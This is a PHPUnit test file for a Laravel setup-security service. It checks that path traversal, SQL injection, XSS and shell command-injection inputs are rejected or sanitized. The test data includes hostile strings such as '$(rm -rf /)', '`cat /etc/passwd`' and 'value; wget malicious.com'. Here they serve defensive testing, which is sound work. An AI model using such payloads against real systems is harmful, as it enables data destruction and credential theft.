<?php

namespace Tests\Unit\Services;

use App\Services\SetupSecurityService;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Tests\TestCase;

class SetupSecurityServiceTest extends TestCase
{
    private SetupSecurityService $securityService;

    protected function setUp(): void
    {
        parent::setUp();
        $this->securityService = new SetupSecurityService();
    }

    /** @test */
    public function validates_and_sanitizes_safe_paths()
    {
        $safePaths = [
            'setup/state.json',
            'backups/backup.json',
            'logs/setup.log'
        ];

        foreach ($safePaths as $path) {
            $result = $this->securityService->validateAndSanitizePath($path);
            
            $this->assertTrue($result['valid'], "Path should be valid: {$path}");
            $this->assertEmpty($result['violations']);
            $this->assertNotEmpty($result['sanitized_path']);
        }
    }

    /** @test */
    public function rejects_dangerous_path_patterns()
    {
        $dangerousPaths = [
            '../../../etc/passwd',
            '..\\..\\Windows\\System32',
            '/etc/shadow',
            'C:\\Windows\\System32\\config',
            '../../../../var/log/auth.log',
            'setup/../../../etc/passwd'
        ];

        foreach ($dangerousPaths as $path) {
            $result = $this->securityService->validateAndSanitizePath($path);
            
            $this->assertFalse($result['valid'], "Path should be rejected: {$path}");
            $this->assertNotEmpty($result['violations']);
        }
    }

    /** @test */
    public function sanitizes_database_configuration_properly()
    {
        $config = [
            'database' => 'test_db; DROP TABLE users;',
            'username' => 'admin\'; DELETE FROM users;',
            'password' => 'validPassword123',
            'host' => 'localhost; cat /etc/passwd',
            'port' => '3306'
        ];

        $result = $this->securityService->sanitizeDatabaseConfig($config);
        
        $this->assertEmpty($result['violations']);
        $this->assertEquals('test_db__DROP_TABLE_users_', $result['sanitized']['database']);
        $this->assertEquals('admin___DELETE_FROM_users_', $result['sanitized']['username']);
        $this->assertEquals('validPassword123', $result['sanitized']['password']);
        $this->assertEquals('localhostcatetcpasswd', $result['sanitized']['host']);
        $this->assertEquals(3306, $result['sanitized']['port']);
    }

    /** @test */
    public function validates_database_configuration_constraints()
    {
        $invalidConfig = [
            'database' => str_repeat('a', 100), // Too long
            'username' => str_repeat('b', 300), // Too long
            'password' => str_repeat('c', 300), // Too long
            'port' => '99999' // Invalid port
        ];

        $result = $this->securityService->sanitizeDatabaseConfig($invalidConfig);
        
        $this->assertNotEmpty($result['violations']);
        $this->assertContains('Database name exceeds maximum length', $result['violations']);
        $this->assertContains('Username exceeds maximum length', $result['violations']);
        $this->assertContains('Password exceeds maximum length', $result['violations']);
        $this->assertContains('Port must be between 1 and 65535', $result['violations']);
    }

    /** @test */
    public function sanitizes_admin_user_input_properly()
    {
        $input = [
            'name' => 'John <script>alert("xss")</script> Doe',
            'email' => 'JOHN.DOE@EXAMPLE.COM',
            'password' => 'SecurePassword123!'
        ];

        $result = $this->securityService->sanitizeAdminUserInput($input);
        
        $this->assertEmpty($result['violations']);
        $this->assertEquals('John scriptalert(xss)script Doe', $result['sanitized']['name']);
        $this->assertEquals('john.doe@example.com', $result['sanitized']['email']);
        $this->assertEquals('SecurePassword123!', $result['sanitized']['password']);
    }

    /** @test */
    public function validates_admin_user_email_format()
    {
        $invalidEmails = [
            'not-an-email',
            'test@',
            '@domain.com',
            'test..test@domain.com',
            'test@domain',
            ''
        ];

        foreach ($invalidEmails as $email) {
            $input = ['email' => $email];
            $result = $this->securityService->sanitizeAdminUserInput($input);
            
            $this->assertNotEmpty($result['violations'], "Should reject invalid email: {$email}");
        }
    }

    /** @test */
    public function sanitizes_storage_configuration_properly()
    {
        $config = [
            'client_id' => 'client123<script>alert("xss")</script>',
            'client_secret' => 'secret456; rm -rf /'
        ];

        $result = $this->securityService->sanitizeStorageConfig($config);
        
        $this->assertEmpty($result['violations']);
        $this->assertEquals('client123scriptalertxssscript', $result['sanitized']['client_id']);
        $this->assertEquals('secret456rmrf', $result['sanitized']['client_secret']);
    }

    /** @test */
    public function validates_environment_variable_names()
    {
        $invalidNames = [
            'lowercase_var',
            '123_INVALID',
            'INVALID-NAME',
            'INVALID.NAME',
            'INVALID SPACE'
        ];

        foreach ($invalidNames as $name) {
            $result = $this->securityService->validateEnvironmentVariable($name, 'value');
            
            $this->assertFalse($result['valid'], "Should reject invalid name: {$name}");
            $this->assertNotEmpty($result['violations']);
        }
    }

    /** @test */
    public function validates_environment_variable_values()
    {
        $dangerousValues = [
            '$(rm -rf /)',
            '`cat /etc/passwd`',
            '${HOME}/malicious',
            'value || rm -rf /',
            'value && cat /etc/shadow',
            'value; wget malicious.com'
        ];

        foreach ($dangerousValues as $value) {
            $result = $this->securityService->validateEnvironmentVariable('VALID_NAME', $value);
            
            $this->assertFalse($result['valid'], "Should reject dangerous value: {$value}");
            $this->assertNotEmpty($result['violations']);
        }
    }

    /** @test */
    public function allows_valid_environment_variables()
    {
        $validCombinations = [
            ['VALID_NAME', 'simple_value'],
            ['APP_URL', 'https://example.com'],
            ['DB_PASSWORD', 'SecurePassword123!@#'],
            ['MAIL_HOST', 'smtp.example.com'],
            ['CACHE_DRIVER', 'redis']
        ];

        foreach ($validCombinations as [$name, $value]) {
            $result = $this->securityService->validateEnvironmentVariable($name, $value);
            
            $this->assertTrue($result['valid'], "Should allow valid combination: {$name}={$value}");
            $this->assertEmpty($result['violations']);
        }
    }

    /** @test */
    public function generates_secure_tokens_with_correct_length()
    {
        $lengths = [16, 32, 64, 128];

        foreach ($lengths as $length) {
            $token = $this->securityService->generateSecureToken($length);
            
            $this->assertEquals($length, strlen($token));
            $this->assertMatchesRegularExpression('/^[a-zA-Z0-9]+$/', $token);
        }
    }

    /** @test */
    public function generates_unique_tokens()
    {
        $tokens = [];
        
        for ($i = 0; $i < 100; $i++) {
            $token = $this->securityService->generateSecureToken();
            $this->assertNotContains($token, $tokens, 'Token should be unique');
            $tokens[] = $token;
        }
    }

    /** @test */
    public function validates_setup_session_structure()
    {
        $validSession = [
            'setup_started_at' => now()->toISOString(),
            'setup_token' => 'validtokenformat12345678901234567890',
            'current_step' => 'database'
        ];

        $result = $this->securityService->validateSetupSession($validSession);
        
        $this->assertTrue($result['valid']);
        $this->assertEmpty($result['violations']);
    }

    /** @test */
    public function rejects_sessions_with_missing_fields()
    {
        $incompleteSessions = [
            ['setup_started_at' => now()->toISOString()], // Missing token and step
            ['setup_token' => 'token123'], // Missing start time and step
            ['current_step' => 'database'], // Missing start time and token
        ];

        foreach ($incompleteSessions as $session) {
            $result = $this->securityService->validateSetupSession($session);
            
            $this->assertFalse($result['valid']);
            $this->assertNotEmpty($result['violations']);
        }
    }

    /** @test */
    public function rejects_sessions_with_invalid_token_format()
    {
        $invalidTokens = [
            'short',
            'contains spaces',
            'contains-special-chars!@#',
            'contains_underscores',
            ''
        ];

        foreach ($invalidTokens as $token) {
            $session = [
                'setup_started_at' => now()->toISOString(),
                'setup_token' => $token,
                'current_step' => 'database'
            ];

            $result = $this->securityService->validateSetupSession($session);
            
            $this->assertFalse($result['valid'], "Should reject invalid token: {$token}");
            $this->assertContains('Invalid setup token format', $result['violations']);
        }
    }

    /** @test */
    public function rejects_expired_sessions()
    {
        $expiredSession = [
            'setup_started_at' => now()->subHours(3)->toISOString(),
            'setup_token' => 'validtokenformat12345678901234567890',
            'current_step' => 'database'
        ];

        $result = $this->securityService->validateSetupSession($expiredSession);
        
        $this->assertFalse($result['valid']);
        $this->assertContains('Setup session has expired', $result['violations']);
    }

    /** @test */
    public function logs_security_events_with_proper_context()
    {
        Log::shouldReceive('channel')
            ->with('security')
            ->once()
            ->andReturnSelf();
            
        Log::shouldReceive('info')
            ->with('Setup security event: test_event', \Mockery::type('array'))
            ->once();

        $this->securityService->logSecurityEvent('test_event', [
            'test_context' => 'test_value'
        ]);
    }

    /** @test */
    public function secure_file_operations_validate_paths()
    {
        // Mock File facade for testing
        File::shouldReceive('exists')
            ->with(\Mockery::type('string'))
            ->andReturn(true);
        File::shouldReceive('makeDirectory')
            ->with(\Mockery::type('string'), 0755, true)
            ->andReturn(true);
        File::shouldReceive('put')
            ->with(\Mockery::type('string'), '{"test": true}')
            ->andReturn(strlen('{"test": true}'));

        $result = $this->securityService->secureFileWrite('valid/path.json', '{"test": true}');
        
        $this->assertTrue($result['success']);
        $this->assertEmpty($result['violations']);
    }

    /** @test */
    public function secure_file_operations_reject_dangerous_paths()
    {
        $result = $this->securityService->secureFileWrite('../../../etc/passwd', 'malicious');
        
        $this->assertFalse($result['success']);
        $this->assertNotEmpty($result['violations']);
        $this->assertStringContainsString('Invalid file path', $result['message']);
    }
}